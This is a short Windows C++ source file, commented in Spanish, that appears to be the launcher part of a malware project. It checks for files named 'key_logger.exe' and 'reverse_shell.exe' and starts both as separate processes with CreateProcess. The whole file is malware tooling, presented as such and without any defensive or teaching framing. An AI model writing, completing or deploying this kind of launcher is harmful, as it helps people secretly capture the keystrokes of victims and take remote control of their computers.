#include <iostream>
#include <fstream>
#include <Windows.h>
#include "errors.hpp"
#pragma comment(lib, "Ws2_32.lib")

// TODO: Arreglar el tema de q el hilo secundario aun sigue aun q se cause un error en el hilo principal causa error


#define key_logger_name "key_logger.exe"
#define reverse_shell_name "reverse_shell.exe"
int main()
{
    std::ifstream key_logger_file(key_logger_name);
    if (!key_logger_file.good())
    {
        std::string path;
        path = "falta el archivo ";
        path += key_logger_name;
        error(path.c_str(), -1);
    }
    std::ifstream reverse_shell_file(reverse_shell_name);
    if (!reverse_shell_file.good())
    {
        std::string path;
        path = "falta el archivo ";
        path += reverse_shell_name;
        error(path.c_str(), -1);
    }

    STARTUPINFO si = {sizeof(si)};
     STARTUPINFO si2 = {sizeof(si2)};
    PROCESS_INFORMATION pi;
    PROCESS_INFORMATION pi2;
    if (!CreateProcess(NULL, (LPSTR) reverse_shell_name, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)
    || !CreateProcess(NULL, (LPSTR) key_logger_name, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2))
    {
        error("no se pudo crear los procesos de dependencias", GetLastError());
    }
}